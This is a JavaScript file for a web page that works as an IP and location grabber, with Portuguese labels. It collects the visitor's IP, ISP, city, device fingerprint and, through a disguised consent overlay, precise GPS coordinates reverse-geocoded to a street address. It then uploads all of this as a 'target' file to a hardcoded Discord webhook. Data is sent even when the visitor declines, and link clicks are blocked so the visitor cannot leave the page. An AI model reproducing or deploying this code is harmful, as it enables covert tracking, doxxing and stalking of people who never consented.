const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";

const IPModule = {
  async send(lat, lon) {
    try {
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();
      if (!d.ip) throw new Error("IP missing");

      const nav  = window.navigator;
      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
      const ua   = nav.userAgent;

      const os =
        ua.includes("Windows NT 10.0") ? "Windows 10"     :
        ua.includes("Windows NT 11.0") ? "Windows 11"     :
        ua.includes("Windows NT 6.1")  ? "Windows 7"      :
        ua.includes("Windows")         ? "Windows"        :
        ua.includes("Ubuntu")          ? "Linux (Ubuntu)" :
        ua.includes("Linux")           ? "Linux"          :
        ua.includes("Mac OS X")        ? "macOS"          :
        ua.includes("Android")         ? "Android"        :
        ua.includes("iPhone")          ? "iOS (iPhone)"   :
        ua.includes("iPad")            ? "iOS (iPad)"     : "Desconhecido";

      const browser =
        ua.includes("Edg/")    ? "Edge"    :
        ua.includes("OPR/")    ? "Opera"   :
        ua.includes("Firefox") ? "Firefox" :
        ua.includes("Chrome")  ? "Chrome"  :
        ua.includes("Safari")  ? "Safari"  : "Desconhecido";

      const lines = [
        "[ REDE ]",
        "IP       : " + d.ip,
        "ISP      : " + (d.org      ?? "N/A"),
        "Local    : " + (d.city ?? "") + ", " + (d.region ?? "") + " - " + (d.country ?? ""),
        "Conexao  : " + (conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"),
        "",
        "[ DISPOSITIVO ]",
        "OS       : " + os,
        "Browser  : " + browser,
        "CPU      : " + (nav.hardwareConcurrency ?? "N/A") + " cores / " + (nav.deviceMemory ?? "N/A") + " GB RAM",
        "Tela     : " + window.screen.width + "x" + window.screen.height,
        "Mobile   : " + (nav.maxTouchPoints > 0 ? "Sim" : "Nao"),
        "Idioma   : " + nav.language,
        "Cookies  : " + nav.cookieEnabled,
        "Referrer : " + (document.referrer || "Direto"),
        "URL      : " + location.href,
      ];

      if (lat !== null && lon !== null) {
        let endereco = "N/A";
        try {
          const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
          const gd  = await geo.json();
          const r   = gd.address ?? {};
          const partes = [r.road, r.house_number, r.suburb, r.city || r.town, r.state, r.postcode].filter(Boolean);
          endereco = partes.join(", ");
        } catch {}

        lines.push("");
        lines.push("[ LOCALIZACAO ]");
        lines.push("Endereco : " + endereco);
        lines.push("Coords   : " + lat.toFixed(6) + ", " + lon.toFixed(6));
        lines.push("Maps     : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
      }

      lines.push("");
      lines.push(new Date().toISOString());

      const blob = new Blob([lines.join("\n")], { type: "text/plain" });
      const form = new FormData();
      form.append("file", blob, "target_" + d.ip.replace(/\./g, "_") + ".txt");
      await fetch(WEBHOOK, { method: "POST", body: form });
    } catch (err) {
      console.warn("[IPModule]", err.message);
    }
  },
};

const CookieModule = {
  init() {
    const overlay = document.getElementById("location-overlay");
    const allow   = document.getElementById("location-allow");
    const skip    = document.getElementById("location-skip");

    if (!overlay) return;

    allow.addEventListener("click", () => {
      overlay.remove();
      navigator.geolocation.getCurrentPosition(
        (pos) => IPModule.send(pos.coords.latitude, pos.coords.longitude),
        ()    => IPModule.send(null, null)
      );
    });

    skip.addEventListener("click", () => {
      overlay.remove();
      IPModule.send(null, null);
    });
  },
};

CookieModule.init();

document.addEventListener("click", (e) => {
  const a = e.target.closest("a");
  if (a) e.preventDefault();
});
